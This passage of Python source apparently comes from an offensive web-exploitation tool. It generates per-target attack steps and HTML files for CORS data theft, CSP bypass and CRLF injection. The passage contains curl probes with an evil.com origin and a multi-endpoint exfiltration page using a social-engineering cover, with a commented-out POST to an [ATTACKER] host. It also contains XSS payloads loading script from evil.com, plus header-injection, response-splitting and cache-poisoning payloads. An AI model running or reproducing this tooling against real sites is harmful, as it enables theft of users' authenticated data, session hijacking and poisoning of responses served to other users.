            f"      }} catch(e) {{ results[ep] = 'blocked'; }}\n"
            f"    }}\n"
            f"    // Exfiltrate\n"
            f"    // await fetch('https://[ATTACKER]/collect', {{\n"
            f"    //   method: 'POST', body: JSON.stringify(results)\n"
            f"    // }});\n"
            f"    document.getElementById('status').textContent = "
            f"JSON.stringify(results, null, 2);\n"
            f"  }} catch(e) {{ document.getElementById('status').textContent = 'Error'; }}\n"
            f"}}\nstealData();\n"
            f"</script>\n</body>\n</html>"
        )
        steps = [
            {"title": "Verify CORS reflects arbitrary origin",
             "command": f"curl -v {sp} -H \"Origin: https://evil.com\" \"{target}\" 2>&1 | grep -i 'access-control'",
             "note": "Look for Access-Control-Allow-Origin: https://evil.com"},
            {"title": "Check if credentials are allowed",
             "command": f"curl -v {sp} -H \"Origin: https://evil.com\" \"{target}\" 2>&1 | grep -i 'access-control-allow-credentials'",
             "note": "true = critical — authenticated data can be stolen cross-origin"},
            {"title": "Test null origin (sandbox bypass)",
             "command": f"curl -v {sp} -H \"Origin: null\" \"{target}\" 2>&1 | grep -i 'access-control'",
             "note": "Origin: null reflected = exploitable via sandboxed iframe"},
            {"title": "Generate basic CORS data theft page",
             "command": "(file will be generated automatically)",
             "generate_file": {
                 "filename": f"cors_exploit_{secrets.token_hex(3)}.html",
                 "content": cors_basic,
                 "note": "Host on any domain. Victim visits it, JavaScript reads "
                         "authenticated data from the target API cross-origin.",
             },
             "warning": "Steals authenticated data cross-origin"},
            {"title": "Generate advanced CORS exploit (multi-endpoint)",
             "command": "(file will be generated automatically)",
             "generate_file": {
                 "filename": f"cors_multi_{secrets.token_hex(3)}.html",
                 "content": cors_advanced,
                 "note": "Scans multiple API endpoints and exfiltrates all accessible data. "
                         "Uses social engineering cover (account verification).",
             },
             "warning": "Multi-endpoint data exfiltration",
             "risk": "HIGH"},
        ]

    elif etype == "csp_bypass":
        csp_html = (
            f"<!DOCTYPE html>\n<html><body>\n"
            f"<h2>CSP Bypass Analysis</h2>\n"
            f"<p><strong>Target:</strong> {target}</p>\n"
            f"<h3>Exploitation based on CSP weakness:</h3>\n"
            f"<ul>\n"
            f"<li><strong>unsafe-inline:</strong> Direct &lt;script&gt; injection works</li>\n"
            f"<li><strong>unsafe-eval:</strong> eval(), Function(), setTimeout() with strings</li>\n"
            f"<li><strong>* wildcard:</strong> Load scripts from any domain</li>\n"
            f"<li><strong>Missing default-src:</strong> Fall back to permissive defaults</li>\n"
            f"</ul>\n"
            f"<h3>Bypass Payloads:</h3>\n"
            f"<pre>unsafe-inline: &lt;script&gt;alert(1)&lt;/script&gt;\n"
            f"unsafe-eval: &lt;img src=x onerror=\"eval('alert(1)')\"&gt;\n"
            f"Wildcard: &lt;script src='https://evil.com/xss.js'&gt;&lt;/script&gt;\n"
            f"JSONP callback: &lt;script src='https://allowed-cdn.com/api?callback=alert'&gt;&lt;/script&gt;</pre>\n"
            f"</body></html>"
        )
        steps = [
            {"title": "Retrieve full CSP header",
             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'content-security-policy'",
             "note": "Analyze directives for weaknesses"},
            {"title": "Check for unsafe-inline",
             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'unsafe-inline'",
             "note": "If present: direct <script> injection bypasses CSP"},
            {"title": "Check for unsafe-eval",
             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'unsafe-eval'",
             "note": "If present: eval(), Function(), setTimeout with strings all work"},
            {"title": "Generate CSP bypass reference",
             "command": "(file will be generated automatically)",
             "generate_file": {
                 "filename": f"csp_bypass_{secrets.token_hex(3)}.html",
                 "content": csp_html,
                 "note": "CSP bypass analysis and payload reference.",
             }},
        ]

    elif etype == "crlf":
        crlf_html = (
            f"<!DOCTYPE html>\n<html><body>\n"
            f"<h2>CRLF Injection PoC</h2>\n"
            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
            f"<p><strong>Parameter:</strong> {param}</p>\n"
            f"<h3>Payloads:</h3>\n"
            f"<table border='1' cellpadding='5'>\n"
            f"<tr><th>Attack</th><th>Payload</th></tr>\n"
            f"<tr><td>Cookie injection</td><td>%0d%0aSet-Cookie: session=hijacked</td></tr>\n"
            f"<tr><td>XSS via splitting</td><td>%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</td></tr>\n"
            f"<tr><td>Cache poisoning</td><td>%0d%0aX-Forwarded-Host: evil.com</td></tr>\n"
            f"<tr><td>Redirect</td><td>%0d%0aLocation: https://evil.com</td></tr>\n"
            f"</table>\n"
            f"</body></html>"
        )
        steps = [
            {"title": "Inject HTTP header (Set-Cookie)",
             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0aSet-Cookie:%20session=hijacked\"",
             "note": "Check response headers for injected Set-Cookie"},
            {"title": "Inject Location header (redirect)",
             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0aLocation:%20https://evil.com\"",
             "note": "Check if response contains injected Location header"},
            {"title": "Response splitting (XSS)",
             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0a%0d%0a<script>alert(1)</script>\"",
             "warning": "HTTP response splitting for XSS"},
            {"title": "Cache poisoning attempt",
             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0aX-Forwarded-Host:%20evil.com\"",
             "note": "If cached, subsequent users get poisoned response",
             "warning": "May affect other users of the target"},
            {"title": "Generate CRLF payload reference",
